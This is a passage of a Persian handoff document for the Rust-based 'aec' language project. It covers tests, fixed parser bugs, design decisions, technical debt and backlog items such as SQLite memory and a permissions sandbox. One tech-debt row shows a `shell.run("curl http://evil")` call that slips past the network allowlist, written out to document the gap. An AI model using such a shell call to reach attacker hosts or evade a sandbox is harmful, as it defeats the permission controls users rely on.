| `crates/aec-parser/tests/interpolation.rs` | ۱۰ | 🆕 (جلسهٔ ۴) `"{expr}"`، براکت‌هایی که expression نیستند، `parse_expr` |
| `crates/aec-parser/tests/result.rs` | ۱۰ | 🆕 (جلسهٔ ۴) `?`، `Result(int, string)`، **رگرسیون دو باگ ۸ و ۹** |
| `crates/aec-parser/tests/lambda.rs` | ۱۲ | 🆕 (جلسهٔ ۴) `x => e`، `x, y => e`، `=> e`، و این‌که identifier/call اشتباه گرفته نشود |
| `crates/aec-runtime/tests/interpreter.rs` | ۲۹ | 🆕 (جلسهٔ ۴) مفسّر: `var`، interpolation، literalها، `Result`/`?`، lambda، capture by-move |
| **جمع** | **۲۱۴** | |

```bash
cargo test --workspace                    # همه
cargo test -p aec-check                   # فقط چکر
cargo test -p aec-cli --test cli_check    # تست باینری
cargo test -p aec-ui                      # تست‌های widgets
cargo test -p aec-runtime --test memory        # تست‌های حافظه
cargo test -p aec-runtime --test permissions   # تست‌های مجوز
cargo test -p aec-parser --test literals       # رگرسیون ترتیب literal
cargo test -p aec-parser --test permissions    # پارس permissions/limits
cargo test -p aec-cli --test permissions_cli   # مجوز روی باینری واقعی
cargo test -p aec-cli --test run_type_gate     # 🆕 گیت نوع در run
cargo test -p aec-parser --test interpolation  # 🆕 interpolation
cargo test -p aec-parser --test result         # 🆕 `?` و Result و optional
cargo test -p aec-parser --test lambda         # 🆕 lambda
cargo test -p aec-runtime --test interpreter   # 🆕 مفسّر: var/interpolation/Result/lambda
```
> ⚠️ `cargo test --workspace` پیش‌فرض **fail-fast** است؛ برای دیدن همهٔ شکست‌ها
> `--no-fail-fast` بزن.

> `aec-ui` به `aec-parser` وابستگی ندارد؛ تست‌هایش AST را **دستی** می‌سازند.
> `aec-check` و `aec-runtime` به‌عنوان **dev-dependency** به `aec-parser` وصل‌اند (برای تست).
> تست‌های حافظه از `std::env::temp_dir()/aec-memory-tests` استفاده می‌کنند (فایل یکتا per تست).

---

## ۱۳) فرمت‌کردن (مهم)

- **هرگز `cargo fmt --all` اجرا نکن.** کل repo با rustfmt پیش‌فرض هم‌خوان نیست
  و صدها خط churn نامرتبط در `aec-runtime/*` و `aec-ast/{error,expr,span,style}.rs` می‌سازد.
- روش درست: فقط فایل دست‌خورده را جدا فرمت کن:
  ```bash
  rustfmt --edition 2021 crates/aec-check/src/lib.rs       # ⚠️ بازگشتی: ماژول‌ها را هم فرمت می‌کند
  rustfmt --edition 2021 crates/aec-check/tests/check.rs
  rustfmt --edition 2021 crates/aec-cli/src/render.rs
  ```
- ⚠️ بعد از `rustfmt` با `git status` چک کن فایل نامرتبطی تغییر نکرده باشد؛
  اگر کرد، `git checkout HEAD -- <همان فایل>` بزن (فقط برای چیزی که خودت خراب کردی).

---

## ۱۴) جدول وضعیت قابلیت‌ها (به‌روز · مرجع دامنه)

| فاز | وزن | وضعیت | امتیاز |
|---|---|---|---|
| زبان (Syntax + Parser + AST) | ۱۵٪ | ۱۰۰٪ | ۱۵ |
| Runtime (Interpreter) | ۱۵٪ | ۱۰۰٪ | ۱۵ |
| Built-ins (Stdlib) | ۱۰٪ | ۸۵٪ | ۸.۵ |
| LLM Adapter | ۵٪ | ۱۰۰٪ | ۵ |
| HTTP / JSON / File / Crypto | ۵٪ | ۱۰۰٪ | ۵ |
| UI DSL | ۱۵٪ | ۹۰٪ | ۱۳.۵ |
| Style System | ۵٪ | ۹۰٪ | ۴.۵ |
| Font + RTL | ۳٪ | ۹۰٪ | ۲.۷ |
| Native Rendering | ۵٪ | ۱۰۰٪ | ۵ |
| Component System | ۵٪ | ۱۰۰٪ | ۵ |
| Theme System | ۳٪ | ۱۰۰٪ | ۳ |
| State Sync (UI ↔ Runtime) | ۵٪ | ۷۵٪ | ۳.۷۵ |
| Type Checker | ۵٪ | ۹۲٪ | ۴.۶ |
| Persistent Memory (SQLite) | ۳٪ | ۱۰۰٪ | ۳ |
| Sandbox / Security | ۳٪ | ۱۰۰٪ | ۳ |
| Package Manager | ۲٪ | ۰٪ | ۰ |
| Cross-platform Build | ۳٪ | ۳۰٪ | ۰.۹ |
| Testing (۲۱۴ تست) | ۳٪ | ۷۵٪ | ۲.۲۵ |
| Docs | ۲٪ | ۳۰٪ | ۰.۶ |
| Examples | ۲٪ | ۷۵٪ | ۱.۵ |
| **جمع** | | | **~۱۰۵ ← متریک اشباع (وزن‌ها ۱۱۴ جمع می‌شوند، نه ۱۰۰)** |

> **⚠️ قرارداد جمع این جدول اشباع شده است** — نگاه کن به دو چیز: (الف) جدول بند ۱۸ که واقعاً چه
> مانده، (ب) سه عدد زیر. اگر عددی در جدول عوض کردی، دوباره جمع بزن ولی بیش از ۱۰۰ گزارش نکن.

سه عدد (تخمینی جلسهٔ ۴): **زبان ~۹۹٪ · زبان UI ~۹۳٪ · محصول production ~۷۵٪**
> «زبان» تقریباً تمام است: `var`/interpolation/`Result`/`?`/closure/نوع تابع همه پیاده شدند.
> تنها چیز باقی‌ماندهٔ زبان = **۱۸.۶** (`import` بی‌اثر).
> «محصول» ناقص است چون Package Manager، Build چندسکویی و CI/Docs نیستند.

---

## ۱۵) باگ‌هایی که رفع شدند (علت ریشه‌ای — دوباره خرابشان نکن)

### باگ ۱ — کامپوننت چندخطی پارس نمی‌شد
- **علامت:** `component A {\n prop…\n render {\n }\n}` → خطا روی `}`.
- **علت:** `component_decl` بین `component_render` و `}` پایانی `NEWLINE*` نداشت،
  و `WHITESPACE` شامل newline نیست.
- **رفع:** `component_render? ~ NEWLINE* ~ "}"`.

### باگ ۲ — `Column background: ...` می‌شکست
- **علت:** `primary_arg` با پذیرش `identifier`، `background` را به‌عنوان آرگومان اصلی می‌خورد.
- **رفع:** `identifier_primary = _{ !(identifier ~ ":") ~ identifier }`.

### باگ ۳ — `and` / `or` در grammar نبودند
- **علامت:** `if cpu > 85 or ram > 90` پارس نمی‌شد و به دو statement جدا تبدیل می‌شد.
- **علت:** `BinaryOp::And/Or` در AST و runtime بود، ولی گرامر قاعدهٔ منطقی نداشت.
- **رفع:** `logical_or_expr`/`logical_and_expr` + `or_op`/`and_op` با گارد مرز کلمه،
  شاخه در `build_expr`، و پشتیبانی `or_op`/`and_op` در `build_binary_chain`.

### باگ ۴ — inline style نادیده گرفته می‌شد
- **علت:** فقط `el.style` (از `style_block`) خوانده می‌شد؛ `ElementModifier::Property` بی‌اثر بود.
- **رفع:** `build_element_style` هر دو منبع را ادغام می‌کند (inline اولویت بالاتر).

### باگ ۵ — خطاها بلوک چندخطی pest را چاپ می‌کردند
- **رفع:** `pest_message()` یک خط خلاصه + `render::snippet` قطعهٔ سورس و caret.

### باگ ۶ — `duration_literal` / `byte_size_literal` / `uuid_literal` هرگز به‌دست نمی‌آمدند (کشف در ۱۸.۲)
- **علامت:** `model m { timeout: 10s }` → خطای پارس. و بدتر: `let x = 10s` **بی‌صدا**
  به دو statement تبدیل می‌شد (`let x = 10` و بعد `s`) چون `s` یک identifier معتبر است.
- **علت:** در `literal = _{ float_literal | int_literal | duration_literal | ... }`
  قاعدهٔ `int_literal` **اول** بود و روی `10s` عدد `10` را می‌خورد؛ PEG در انتخاب ترتیبی
  به alternative بعدی برنمی‌گردد.
- **رفع (دو بخش، هر دو لازم):**
  1. ترتیب → `float_literal | duration_literal | byte_size_literal | uuid_literal | int_literal | ...`
  2. `duration_literal` و `byte_size_literal` از `{ }` به **`${ }` (compound-atomic)**
     تغییر کردند تا فاصله بین عدد و واحد مجاز **نباشد**. بدون این، `size: 20 spacing: 4`
     عدد `20` را با `s` از `spacing` می‌خورد (`20s`).
- **تست نگهبان:** `crates/aec-parser/tests/literals.rs` (۸ تست). اگر ترتیب عوض شود، می‌شکند.
- ⚠️ **این باگ قبلاً در هندآف مستند شده بود ولی هرگز تست نشده بود** — یعنی `10s` در گرامر
  «هست» ولی عملاً کار نمی‌کرد.

### باگ ۷ — کامنت ترجمه‌شده بدون `//` (اشتباه خودم، جلسهٔ سوم)
- **علامت:** `error: expected one of ... found ','` در `aec-ui/src/widgets.rs:52`.
- **علت:** در ترجمهٔ یک کامنت دو خطی، خط دوم بدون `//` نوشته شد و تبدیل به کد شد.
- **درس:** بعد از هر ویرایش کامنت در مقیاس، حتماً `cargo check --workspace` بزن — grep
  نمی‌گیرد. (خیلی از کامنت‌های این مخزن الان انگلیسی‌اند و در جلسهٔ قبل ترجمه شدند.)

### باگ ۸ — `none` به‌عنوان **مقدار** هرگز پارس نمی‌شد (کشف در جلسهٔ ۴)
- **علامت:** `let x = none` → `error: expected base expression` با caret روی `none`.
- **علت:** در `literal = _{ ... | "none" }` رشتهٔ `"none"` یک **literal بی‌نام** بود.
  قواعد silent (`_{ }`) هیچ `Pair` تولید نمی‌کنند؛ پس `postfix_expr` هیچ فرزندی نداشت و
  `build_postfix` با «expected base expression» می‌ترکید. یعنی `Literal::None` عملاً **مرده** بود
  و `let x: int? = none` هیچ‌وقت کار نمی‌کرد (ولی `none` به‌عنوان *pattern* کار می‌کرد،
  چون `none_pattern` قاعدهٔ نامدار است).
- **رفع:** قاعدهٔ نامدار `none_literal = { "none" }` اضافه شد و در `build_literal`،
  `build_primary` و `build_pattern` شاخه گرفت.
- **درس کلی (مهم):** **هر literal/کلیدواژه‌ای که می‌خواهی در AST ظاهر شود باید قاعدهٔ نامدار باشد.**
  یک literal بی‌نام داخل قاعدهٔ silent، در پارسر **موفق** می‌شود ولی به builder **چیزی نمی‌رساند**.
  (همین الگو باعث باگ ۹ هم شد.)
- **تست نگهبان:** `crates/aec-parser/tests/result.rs::none_is_usable_as_a_value`.

### باگ ۹ — `?` در **نوع** بی‌صدا دور ریخته می‌شد (کشف در جلسهٔ ۴)
- **علامت:** `fn f() -> int?` و `let x: int? = none` پارس می‌شدند ولی نوع واقعی `int` بود،
  نه `Optional(int)`. یعنی `TypeExpr::Optional` هم **مرده** بود.
- **علت:** `full_type = { base_type ~ "?"? }` — `"?"?` یک literal بی‌نام بود، پس
  `build_full_type` هیچ‌وقت علامت `?` را نمی‌دید. `let_stmt` هم مستقیماً `base_type` می‌گرفت
  و `"?"` را دور می‌ریخت.
- **رفع:** `optional_marker = { "?" }` (نامدار) + `full_type = { base_type ~ optional_marker? }`
  + استفادهٔ `full_type` در `let_stmt`/`var_stmt`/`param` + شاخهٔ `Rule::full_type` در builder.
- **تست نگهبان:** `optional_type_annotation_still_parses`، `optional_return_type_is_preserved`،
  `optional_parameter_type_is_preserved` در `crates/aec-parser/tests/result.rs`.

### باگ ۱۰ — لیست builtinهای چکر ناقص بود (کشف در جلسهٔ ۴)
- **علامت:** `upper(s)`، `min(1,2)`، `pi`، `ls(".")`، `md5(s)` و … **هشدار کاذب**
  «undeclared variable» می‌گرفتند، چون `DiagKind::UndeclaredVariable` یک Warning است
  ولی برنامه را کثیف می‌کرد.
- **علت:** `BUILTIN_NAMESPACES`/`BUILTIN_FUNCTIONS` در `aec-check/src/checker.rs` با واقعیت
  runtime منطبق نبودند (namespace `llm` و همهٔ نام‌های underscore مثل `file_read` جا افتاده بودند).
- **رفع:** هر دو لیست از روی `match`های واقعی سه فایل runtime بازنویسی و گروه‌بندی شدند
  (`interpreter.rs`، `stdlib.rs`، `stdlib_extended.rs`) + دو تست نگهبان در
  `crates/aec-check/tests/check.rs` که تقریباً **همهٔ** builtinها را صدا می‌زنند و انتظار
  صفر تشخیص دارند. اگر builtin جدیدی اضافه کردی و لیست را به‌روز نکنی، آن تست می‌شکند.

---

## ۱۶) تصمیم‌های قفل‌شده (دوباره بازشان نکن)

| موضوع | تصمیم |
|---|---|
| ارجاع theme | گروه‌بندی‌شده: `theme.<group>.<token>` |
| تم فعال | آن‌که `default` دارد؛ وگرنه اگر تنها یک تم باشد همان |
| ارث‌بری تم | `theme X extends Y` با اورراید؛ گارد حلقه دارد |
| توکن حل‌نشده | property **بی‌صدا حذف** می‌شود (بدون panic) |
| پیش‌فرض متن | `color.text` → color، `text.size` → size، `text.weight` → weight |
| پیش‌فرض کارت | `color.surface` → background |
| پس‌زمینهٔ پنل | `color.background` در `renderer.rs` |
| کامپوننت ناشناخته | بی‌صدا حذف (بدون panic) |
| کامپوننت بدون render | `None` |
| Recursion | گارد فقط برای زیردرخت کامپوننت جاری؛ بعدش `remove` |
| state کامپوننت | clone از state والد؛ **به والد نشت نمی‌کند** |
| propها | با state والد ارزیابی می‌شوند |
| چکر نوع | ملایم؛ `Any` فراگیر؛ متغیر تعریف‌نشده = Warning |
| اولویت عملگر | `or` < `and` < comparison < additive < multiplicative < unary |
| `component_use` | قبل از `element_expr` + lookahead منفی روی نام‌های built-in |
| UI Adapter Rule | هر مؤلفهٔ گرامری باید حداقل دو رندرر داشته باشد |
| **زبان پیام‌ها** | همهٔ تشخیص‌ها و کامنت‌ها **انگلیسی**؛ فارسی فقط محتوای برنامه و دادهٔ تست (۱۸.۲/جلسهٔ ۳) |
| **حافظهٔ پیوسته** | در حالت SQLite، **DB منبع حقیقت است نه کش** (دو نمونه روی یک فایل واگرا نشوند) |
| **حافظهٔ in-memory** | بدون `memory.open` رفتار قبلی دست‌نخورده؛ `add/get/clear/len/to_value` حالا `Result` |
| **Sandbox: فعال‌سازی** | نبود بلاک `permissions` = **بدون گیت** (سازگار با گذشته). وجودش = **پیش‌فرض بسته** |
| **Sandbox: allowlist دامنه** | مقایسه case-insensitive، پورت نادیده، تطبیق **دقیق** (بدون wildcard) |
| **Sandbox: مقایسهٔ مسیر** | مطلق‌سازی نسبت به CWD، حل symlink اگر موجود باشد، وگرنه نرمال‌سازی متنی؛ مقایسه **component-wise** (`/a` مسیر `/a-evil` را نمی‌پذیرد) |
| **Sandbox: `file.copy`** | هم read مبدأ و هم write مقصد را نیاز دارد |
| **Sandbox: محدوده** | نگهبان **درون‌پروسه‌ای و همکارانه** است، نه sandbox سیستمی؛ `shell.run` بیرون آن است |
| **limits.timeout** | روی چهار درخواست HTTP اعمال می‌شود (پیش‌فرض ۳۰ ثانیه) |
| **limits.concurrency** | فقط ذخیره می‌شود؛ مفسّر تک‌رشته‌ای است پس سقف نقض‌شدنی نیست (با async در ۱۸.۷ معنادار می‌شود) |
| **گرامر `literal`** | شکل‌های خاص (`duration`/`byte_size`/`uuid`) **پیش از** `int_literal`؛ duration/byte_size **`${ }`** |
| **هر literal/کلیدواژه** | باید **قاعدهٔ نامدار** باشد (باگ ۸ و ۹)؛ literal بی‌نام در قاعدهٔ silent به builder نمی‌رسد |
| **`let` / `var`** | `let` تغییرناپذیر، `var` تغییرپذیر؛ assign به `let` = خطای `AssignToImmutable` (مقدار **هم** type-check می‌شود تا هر دو خطا دیده شود) |
| **پارامترها و متغیر حلقه** | پارامتر تابع `mutable = true`؛ متغیر `for` **تغییرناپذیر** (مثل Rust) |
| **Interpolation** | `"{expr}"` فقط وقتی interpolation است که **متن داخل براکت یک expression معتبر پارس شود**؛ وگرنه براکت‌ها متن خام می‌مانند (سازگاری با `json.parse("{ \"a\": 1 }")`) |
| **Unpack در interpolation** | اگر مقدار `Value::Object` با کلید `text` بود، همان چاپ می‌شود (پروتکل پاسخ مدل) |
| **`Result` constructors** | `ok(v)` / `err(e)` به‌عنوان builtin سراسری (کاربر جلسهٔ ۴ تأیید کرد) — نه `Ok`/`Err` و نه namespace |
| **معنای `?`** | روی `ok(v)` → `v`؛ روی `err(e)` → `err(e)` از **تابع فعلی** برگردانده می‌شود (early return). روی مقدار غیر-Result → خطای runtime |
| **پیاده‌سازی `?`** | سیگنال unwinding = `RuntimeError::EarlyReturn { value }` با `#[doc(hidden)]`، **فقط** در `call_function` (و `call_closure`) گرفته می‌شود |
| **`?` داخل lambda** | خطا از **خود lambda** برمی‌گردد، نه از تابع بیرونی |
| **نوع تابع** | کلیدواژهٔ `function` (کاربر جلسهٔ ۴ تأیید کرد). امضای کامل (`fn(int) -> int`) فعلاً نیست چون `Ty::Function` هیچ اطلاعات پارامتری ندارد |
| **lambda** | `x => e` / `x, y => e` / `=> e`؛ در `primary_expr` **اول** می‌آید (روی identifier ساده، `=>` شکست می‌خورد و choice به `identifier` برمی‌گردد) |
| **capture در lambda** | **by-move**: snapshot از متغیرهای محلی در لحظهٔ ساخت. **globalها داخل snapshot نیستند** بلکه از طریق parent link قابل دسترسی‌اند (تا فراخوانی `fn` سراسری و بازگشت کار کند) |
| **فایل‌های تصمیم‌نشده** | سینتکس جدید بعدی (مثل `pub` یا امضای کامل تابع یا built-inهای higher-order) **باید از کاربر پرسیده شود** — قاعدهٔ ۹ |

---

## ۱۷) بدهی فنی و warningهای شناخته‌شده

| مورد | جزئیات | اقدام |
|---|---|---|
| `unused variable: padding` | `crates/aec-ui/src/renderer.rs` در رندر Button؛ `style.padding` محاسبه می‌شود ولی اعمال **نمی‌شود**. | یا `padding` را واقعاً اعمال کن (`egui::Button` margin)، یا حذفش کن. عمداً دست‌نخورده مانده چون بیربط به کارهای قبلی بود. |
| `import` بی‌اثر | پارسر `ImportStmt` می‌سازد، ولی `Interpreter::run` هیچ کاری با آن نمی‌کند. | آیتم ۱۸.۶ |
| لیست builtin چکر | `BUILTIN_NAMESPACES`/`BUILTIN_FUNCTIONS` کامل نیستند. | آیتم ۱۸.۱۳ |
| `Literal::Interpolated` بی‌استفاده | AST دارد، پارسر تولید نمی‌کند. | آیتم ۱۸.۷ |
| `TypeExpr::Named` → `Any` | نوع کاربر (struct) وجود ندارد. | آیتم ۱۸.۸ |
| `TypeRef`/`StyleValue` بدون `PartialEq` | مقایسهٔ مستقیم ممکن نیست (تست‌ها از `matches!`/`get_string` استفاده می‌کنند). | در صورت نیاز derive کن. |
| `run` بدون گیت نوع | برنامهٔ دارای خطای نوع اجرا می‌شود. | آیتم ۱۸.۵ |
| UI/Theme بدون بررسی نوع | چکر فقط بدنهٔ توابع را می‌بیند. | آیتم ۱۸.۸ |
| `Duration`/`ByteSize` → `Any`/`Bytes` | در چکر دقیق مدل نشده. | جزئی |
| `aec-ui/src/lib.rs` re-export | `build_widgets*`, `Themes`, `ComponentRegistry`, `WidgetStyle`, `ResolvedTheme` همه export شده‌اند. | نکته |
| 🔴 **`shell.run` از sandbox بیرون است** | با `permissions { network: [] }` باز هم می‌شود `shell.run("curl http://evil")` زد. یعنی ضمانت sandbox **شکستنی** است. | سینتکس جدید لازم دارد (مثلاً `system { exec: [...] }`). **این یک تصمیم طراحی است و باید خود کاربر تأیید کند — عمداً از خودم سینتکس نساختم.** |
| `sys.exit` گیت‌نشده | طبق سند طراحی همیشه مجاز است. | قابل قبول؛ در بخش ۸ مستند شد. |
| `deepseek`/حافظهٔ `Memory` بدون تست همروندی | دو نمونه روی **یک فایل** تست شده؛ دو نمونه **هم‌زمانِ نوشته‌گر** تست نشده (SQLite قفل می‌کند). | اگر لازم شد تست کن. |
| `limits.concurrency` بی‌اثر | فقط ذخیره می‌شود. | با async معنادار می‌شود → ۱۸.۷ |
| الگوهای wildcard دامنه | `network: ["*.example.com"]` پشتیبانی **نمی‌شود** (تطبیق دقیق). | اگر لازم شد اضافه کن. |
| `~` در مسیرهای filesystem | مسیر `~/data` گسترش **نمی‌یابد**. | مستند/اضافه کن اگر لازم شد. |
| `docs/roadmap.html` عقب افتاده | اعدادش برای ۱۸.۱ به‌روز شد ولی برای ۱۸.۲ نه (Sandbox را همچنان ۰٪ نشان می‌دهد). | اگر خواستی: Sandbox → ۱۰۰٪/۳، Testing → ۷۰٪، Examples → ۶۰٪. **جمعش هم مثل بخش ۱۴ اشباع می‌شود.** |
| چک‌لیست builtin چکر ناقص | `min/max/keys/values/split/join/trim/upper/lower/contains/replace/range/sqrt/pow/abs/read_line` نیست → هشدار کاذب «undeclared variable». | ✅ **رفع شد (جلسهٔ ۴ / باگ ۱۰)** — حالا دو تست نگهبان دارد |
| 🔴 **builtinها نمی‌توانند lambda صدا بزنند** | توابع stdlib فقط `&[Value]` می‌گیرند و به `Interpreter` دسترسی ندارند، پس `map`/`filter`/`sort_by` با closure **ممکن نیست**. | نیاز به تغییر معماری (پاس‌دادن یک callback به stdlib). تا آن زمان closure فقط از کد کاربر قابل صدا زدن است. **اگر لازم شد، تصمیم با کاربر.** |
| **بدون امضای کامل تابع** | `function` فقط «یک تابع، هر امضایی» است؛ چکر arity/نوع آرگومان‌های closure را چک نمی‌کند. | اگر لازم شد `fn(int) -> int` را اضافه کن (کاربر باید تأیید کند) |
| **متغیر حلقه تغییرناپذیر** | `for it in items { it = 0 }` → `AssignToImmutable` | عمدی (مثل Rust). اگر کاربر خواست، عوض کن |
| **`capture_env` همهٔ محلی‌ها را کپی می‌کند** | یک lambda همهٔ متغیرهای محلی در دسترس را snapshot می‌کند، نه فقط آن‌هایی که استفاده می‌کند. | هزینه‌اش O(تعداد متغیرهای در دسترس) در لحظهٔ ساخت lambda. برای این مقیاس قابل قبول. |
| **`Value::Closure` در JSON** | `json.stringify(lambda)` → `null` (مثل `Function`). | قابل قبول؛ در `value_to_json` مستند شد |
| **`Interpreter::eval_expr` عمومی است** | `pub fn eval_expr` → می‌تواند `RuntimeError::EarlyReturn` را بیرون بدهد اگر کاربر خودش صدایش بزند. | اگر لازم شد `pub(crate)` کن یا یک wrapper بگذار |
| `docs/roadmap.html` عقب افتاده | اعداد جلسهٔ ۴ هم در آن نیست (۱۸.۵/۱۸.۷/۱۸.۱۳). | اگر خواستی به‌روز کن — یادت باشد جمعش اشباع می‌شود، بیش از ۱۰۰ گزارش نکن |

---

## ۱۸) بکلاگ — وضعیت در یک نگاه

> **این جدول را اول بخوان.** ستون «وضعیت» بر اساس بازبینی واقعی مخزن در جلسهٔ سوم است،
> نه حدس. ترتیب پیشنهادی کار = ستون «اولویت».

| # | آیتم | وزن | وضعیت | اولویت |
|---|---|---|---|---|
| ۱۸.۱ | Persistent Memory (SQLite) | ۳٪ | ✅ **تمام** | — |
| ۱۸.۲ | Sandbox / Permissions | ۳٪ | ✅ **تمام** | — |
| ۱۸.۳ | Cross-platform Build + CI | ۳٪ | ❌ شروع نشده | ۳ |
| ۱۸.۴ | State Sync کامل (UI↔Runtime) | ۵٪ | ❌ ناقص (~۷۵٪) | ۲ |
| ۱۸.۵ | گیت نوع در `aec run` | — | ✅ **تمام (جلسهٔ ۴)** | — |
| ۱۸.۵ | گیت نوع در `aec run` | — | ✅ **تمام (جلسهٔ ۴)** | — |
| ۱۸.۶ | Modules/چندفایلی + `pub` | — | ❌ شروع نشده (`import` بی‌اثر) | **۱** |
| ۱۸.۷ | `var` + interpolation + `Result`/`?` + closure | — | ✅ **تمام (جلسهٔ ۴)** | — |
| ۱۸.۸ | Type Checker فاز ۲ | ۵٪ | ❌ ناقص (~۹۲٪) | ۴ |
| ۱۸.۹ | Testing + CI | ۳٪ | ◐ ۲۱۴ تست، **بدون CI** | ۲ |
| ۱۸.۱۰ | Docs + Examples | ۴٪ | ◐ ناقص (۴ مثال `.aec` جدید اضافه شد) | ۴ |
| ۱۸.۱۱ | Package Manager (AECPM) | ۲٪ | ❌ شروع نشده | ۵ |
| ۱۸.۱۲ | Optimization / A2A / IDE | — | ❌ شروع نشده | ۶ |
| ۱۸.۱۳ | Quick Wins | — | ✅ **تمام (جلسهٔ ۴)** (به‌جز آیتم ۵ = roadmap.html) | — |

**اگر فقط یک نشست کوتاه داری:** ۱۸.۹ (CI) — ارزان و اثر فوری.
**اگر می‌خواهی زبان کامل‌تر شود:** ۱۸.۶ (ماژول‌ها) — آخرین شکاف زبان.
**اگر می‌خواهی محصول قابل‌تحویل شود:** ۱۸.۹ + ۱۸.۱۰ + ۱۸.۳.

---

### ۱۸.۱ Persistent Memory (SQLite) — وزن ۳٪ — ✅ **انجام شد**
### ۱۸.۱ Persistent Memory (SQLite) — وزن ۳٪ — ✅ **انجام شد**

**هدف:** حافظهٔ گفتگو بین اجراها باقی بماند.

**وضعیت قبل:** `crates/aec-runtime/src/memory.rs` یک `HashMap` در حافظه بود
(`Message`, `Memory::{new,add,get,clear,len,to_value}`). با پایان پروسه پاک می‌شد.

**وضعیت بعد (پیاده‌شده):**
- `Cargo.toml` workspace: `rusqlite = { version = "0.40", features = ["bundled"] }`
  (⚠️ هندآف نسخهٔ ۰.۳۱ را پیشنهاد کرده بود؛ resolver نسخهٔ ۰.۴۰ را آورد و کار می‌کند.
  `bundled` یعنی SQLite سیستمی لازم نیست، ولی **کامپایلر C لازم است** — روی این ماشین `cc` هست.)
- `crates/aec-runtime/Cargo.toml`: `rusqlite.workspace = true` + dev-dep `aec-parser` (برای تست e2e).
- `crates/aec-runtime/src/memory.rs`: بازنویسی → `Memory { conversations, db: Option<Connection> }`.
  - `Memory::open(path)` جدول را با `CREATE TABLE IF NOT EXISTS` + index می‌سازد:
    ```sql
    CREATE TABLE IF NOT EXISTS messages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      conv_id TEXT NOT NULL, role TEXT NOT NULL, content TEXT NOT NULL
    );
    CREATE INDEX IF NOT EXISTS idx_messages_conv ON messages (conv_id, id);
    ```
  - `add/get/clear/len/to_value` حالا `Result` برمی‌گردانند؛ `is_empty` اضافه شد.
  - `Debug` **دستی** impl شده (نمایش backend به‌جای dump اتصال).
- `crates/aec-runtime/src/errors.rs`: `RuntimeError::with_span(span)` اضافه شد.
- `crates/aec-runtime/src/interpreter.rs`: builtin جدید `memory.open` / `memory_open`.
- `crates/aec-runtime/tests/memory.rs`: **۱۱ تست** (جدید).
- `examples/memory.aec`: مثال اجرائی (با `aec run examples/memory.aec --cli --entry main`).
- `.gitignore`: `*.sqlite`, `*.sqlite-journal`, `*.sqlite-wal`.

**تصمیم قفل‌شده:** در حالت پیوسته **DB منبع حقیقت است، نه کش** — یعنی `get`/`len`
مستقیماً از SQLite می‌خوانند. دلیل: با کش، دو نمونهٔ هم‌زمان روی یک فایل بی‌صدا واگرا می‌شدند
(تست: `sqlite_reads_see_writes_from_another_instance`).
**بدون `memory.open`، رفتار قبلی (in-memory) دست‌نخورده است** → هیچ برنامه‌ای نمی‌شکند.

**معیار پذیرش (DoD) — هر سه محقق شد:**
- ✅ `Memory::open(path)` → add → drop → `Memory::open(path)` → همان پیام‌ها (`sqlite_survives_reopen`).
- ✅ تست نوشته شد و `cargo test --workspace` سبز (۸۱ تست **در آن زمان**؛ کل مخزن الان **۲۱۴** تست دارد).
- ✅ API قدیمی in-memory نمی‌شکند (`in_memory_add_get_len_clear`).

**اثبات end-to-end (اجرای واقعی مثال، دو بار):**
```
اجرای اول:  پیام‌های قبلی: 0  →  تعداد بعد از افزودن: 2
اجرای دوم:  پیام‌های قبلی: 2  →  تعداد بعد از افزودن: 4
```

**گاتچای کشف‌شده (مهم برای مثال‌های اجرائی):** `fn` بدون نوع بازگشتی = `unit` است،
پس `fn main() { ... return 0 }` **خطای نوع** می‌دهد. باید `fn main() -> int` نوشت
(یا `return` بدون مقدار). این باگ نیست — تصمیم چکر است.

---

### ۱۸.۲ Sandbox / Permissions — وزن ۳٪ — ✅ **انجام شد**

**هدف:** زبان بتواند مجوزها را اعلام و runtime اعمال کند.

**سینتکس (پیاده‌شده و آزمایش‌شده):**
```aec
permissions {
    network: ["api.openai.com", "api.telegram.org"]
    filesystem {
        read:  ["/var/log/sysstat"]
        write: ["cache"]
    }
    system {
        metrics: true
        restart: false
    }
}

limits {
    concurrency: 8
    timeout: 10s
}
```

**چه ساخته شد:**
- `crates/aec-ast/src/permissions.rs` (جدید) + `TopLevelItem::{Permissions,Limits}` + re-export.
- `crates/aec-parser/src/grammar.pest`: `permissions_block`, `limits_block` و زیرقواعدشان؛
  همه‌جا `NEWLINE*` (نه `NEWLINE`) تا گاتچای کامپوننت چندخطی تکرار نشود.
- `crates/aec-parser/src/build_ast.rs`: ۶ builder. **فیلد ناشناخته خطای پارس می‌دهد**
  (`filesystem { execute: [...] }` و `limits { memory: ... }` رد می‌شوند) — بهتر از نادیده‌گرفتن بی‌صدا.
- `crates/aec-runtime/src/permissions.rs` (جدید): `Permissions`, `Limits`, `FsMode`,
  `extract_host`, `normalize_path`, `denied`, `DEFAULT_HTTP_TIMEOUT_MS`.
- `crates/aec-runtime/src/errors.rs`: variant جدید `PermissionDenied` + `with_span`.
- `crates/aec-runtime/src/interpreter.rs`: `permissions`/`limits` فیلد + پر شدن در `run`
  + گیت در ابتدای `try_builtin`.
- `crates/aec-runtime/src/stdlib*.rs`: `limits` به امضای `call_builtin`/`call_extended` اضافه شد
  تا `.timeout(limits.http_timeout())` جای ۳۰ ثانیهٔ hardcode‌شده را بگیرد.
- `examples/sandbox.aec` + ۳۲ تست جدید (۷ پارسر + ۱۹ runtime + ۶ CLI).

**تصمیم قفل‌شده (مهم):** نبود بلاک `permissions` = **بدون هیچ گیتی** (سازگاری کامل با گذشته).
وجود بلاک = **پیش‌فرض بسته**: هر کلید اعلام‌نشده یعنی «مجاز نیست».
تست regression: `without_permissions_block_nothing_is_gated`.

**معیار پذیرش — هر سه محقق شد:**
- ✅ `permissions { network: ["example.com"] }` + درخواست به دامنهٔ دیگر → خطای واضح
  (تست runtime + تست CLI روی باینری واقعی).
- ✅ allow و deny برای network و filesystem (۱۹ تست).
- ✅ بدون بلاک، رفتار قبلی دست‌نخورده (تست regression در هر سه سطح).

**اثبات عینی (باینری واقعی):**
```
$ aec run deny.aec --cli --entry try_fetch
❌ Runtime error!
   permission denied: network denied: host "evil.example" is not in the allowlist (allowed: api.example.com)
EXIT=1
```

**⚠️ محدودیت‌ها که باید بدانی (جزئیات در بخش ۱۷):**
- `shell.run` **گیت نمی‌شود** → ضمانت sandbox شکستنی است. رفعش سینتکس جدید می‌خواهد
  (تصمیم طراحی، مال کاربر).
- `limits.concurrency` فقط ذخیره می‌شود (مفسّر تک‌رشته‌ای است).
- wildcard دامنه و `~` در مسیر پشتیبانی نمی‌شوند.

